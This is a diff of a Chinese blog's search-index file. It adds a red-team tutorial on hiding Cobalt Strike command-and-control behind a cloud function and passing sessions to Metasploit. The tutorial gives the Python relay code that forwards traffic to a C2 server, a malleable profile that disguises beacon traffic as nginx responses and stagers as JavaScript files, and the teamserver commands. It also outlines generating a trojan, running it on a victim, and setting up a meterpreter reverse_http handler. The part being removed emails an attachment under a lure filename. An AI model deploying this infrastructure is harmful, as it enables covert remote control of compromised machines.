class="line">msg[&#39;To&#39;] &#x3D; msg_to</span><br><span class="line">#添加附件内容</span><br><span class="line">msg.attach(content_part)</span><br><span class="line"></span><br><span class="line">#*********************构造附件***********</span><br><span class="line"># 文本类型的附件</span><br><span class="line">att1 &#x3D; MIMEText(open(&quot;.&#x2F;baidu.doc&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att1[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att1.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;学习最新信息.txt&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att1)</span><br><span class="line"></span><br><span class="line"># 图片附件</span><br><span class="line">att2 &#x3D; MIMEText(open(&quot;.&#x2F;4.png&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att2[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att2.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;小猪猪.png&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att2)</span><br><span class="line">#连接服务器</span><br><span class="line">s&#x3D; smtplib.SMTP_SSL(&#39;smtp.qq.com&#39;,465)</span><br><span class="line"># 登陆我的邮箱</span><br><span class="line">s.login(email_name,passwd)</span><br><span class="line"># 发送邮箱</span><br><span class="line">s.sendmail(email_name,msg_to,msg.as_string())</span><br><span class="line">print(&quot;发送成功&quot;)</span><br></pre></td></tr></table></figure>]]></content>
+    <title>云函数和cs并派生到msf</title>
+    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
+    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
+<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
+<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
+<p>云函数内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
+<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
+<p>修改后发布即可</p>
+<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
+<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
+<p><strong>可以使用80和443两个端口</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
+<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
+<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
+<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
+<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
+<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
+<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
+<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
+<p>失败emmmm</p>
+]]></content>
       <categories>
-        <category>邮件</category>
+        <category>安全</category>
+        <category>Tools</category>
       </categories>
       <tags>
-        <tag>python</tag>
+        <tag>安全</tag>
       </tags>
   </entry>
   <entry>
